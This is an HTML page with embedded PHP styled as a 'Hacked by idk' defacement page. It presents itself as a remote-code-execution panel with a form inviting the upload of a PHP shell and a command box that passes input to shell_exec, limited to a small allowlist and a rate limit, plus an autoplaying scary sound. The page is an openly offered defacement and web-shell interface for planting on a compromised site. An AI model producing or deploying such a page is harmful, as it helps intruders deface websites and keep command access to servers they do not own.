<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacked by idk</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
        }
        .hacked {
            font-size: 2em;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        .container {
            margin-top: 50px;
            color: red;
        }
        .input-box {
            margin-top: 20px;
        }
        input[type="text"], input[type="submit"] {
            padding: 10px;
            font-size: 1em;
            border: none;
            outline: none;
        }
        input[type="text"] {
            width: 300px; /* Adjust width for the search box */
            background-color: black;
            color: lime;
        }
        input[type="submit"] {
            background-color: lime;
            color: black;
            cursor: pointer;
        }
        .output {
            margin-top: 20px;
            color: yellow;
            background-color: black;
            border: 1px solid lime;
            padding: 10px;
        }
        .feedback {
            margin-top: 10px;
            color: red;
        }
        #loading {
            display: none;
            color: yellow;
        }
    </style>
</head>
<body>
    <h1 class="hacked">Hacked by idk</h1>
    <h2>Remote Code Execution</h2>
    <p>Upload your PHP shell and execute commands</p>

    <div class="container">
        <form action="upload.php" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload PHP File" name="submit">
        </form>
    </div>

    <div class="input-box">
        <form method="post">
            <input type="text" name="cmd" placeholder="Enter your command">
            <input type="submit" value="Execute">
        </form>
    </div>

    <div id="loading">Loading...</div>

    <div class="output">
        <h2>Command Output:</h2>
        <pre>
            <?php
            session_start();
            $allowed_commands = ['ls', 'whoami', 'pwd']; // Allowed commands

            if (isset($_POST['cmd'])) {
                $cmd = escapeshellcmd(trim($_POST['cmd']));

                // Command rate limiting
                if (!isset($_SESSION['command_count'])) {
                    $_SESSION['command_count'] = 0;
                    $_SESSION['command_time'] = time();
                }
                if (time() - $_SESSION['command_time'] > 60) {
                    $_SESSION['command_count'] = 0;
                    $_SESSION['command_time'] = time();
                }
                $_SESSION['command_count']++;
                if ($_SESSION['command_count'] > 5) {
                    echo "Rate limit exceeded. Please wait before executing more commands.";
                    exit;
                }

                // Command execution
                if (in_array($cmd, $allowed_commands)) {
                    $output = shell_exec($cmd);
                    echo htmlspecialchars($output); // Display output safely
                    // Log command execution
                    file_put_contents('command_log.txt', date('Y-m-d H:i:s') . " - Command: $cmd - Output: " . $output . "\n", FILE_APPEND);
                    echo "<div class='feedback'>Command executed successfully.</div>";
                } else {
                    echo "Command not allowed.";
                }
            }
            ?>
        </pre>
    </div>

    <script>
        // Add a loading animation when the page loads
        const form = document.querySelector('.input-box form');
        form.addEventListener('submit', function() {
            document.getElementById('loading').style.display = 'block';
        });

        // Add a scary sound effect when the page loads
        window.onload = function() {
            var audio = new Audio('scary-sound.mp3');  // Include a scary sound file in the directory
            audio.play();
        }
    </script>
</body>
</html>
